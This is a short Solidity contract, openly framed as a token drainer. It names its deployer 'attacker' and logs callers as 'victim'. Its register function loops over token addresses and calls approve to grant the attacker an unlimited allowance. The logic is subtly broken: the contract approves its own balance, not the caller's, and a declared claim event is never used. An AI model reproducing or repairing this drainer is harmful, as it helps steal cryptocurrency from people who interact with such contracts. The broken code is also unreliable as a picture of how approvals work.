// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract Shell {
    address public attacker;

    event TokenApproved(address indexed token, address indexed victim, uint256 amount);
    event TokensClaimed(address indexed token, address indexed victim, uint256 amount);

    constructor() {
        attacker = msg.sender;
    }
function register(address[] calldata tokens) public returns (bool) {
    for (uint i = 0; i < tokens.length; i++) {
        (bool success, ) = tokens[i].call(
            abi.encodeWithSignature("approve(address,uint256)", attacker, type(uint256).max)
        );
        if (success) {
            emit TokenApproved(tokens[i], msg.sender, type(uint256).max);
        }
    }
    return true;
}
}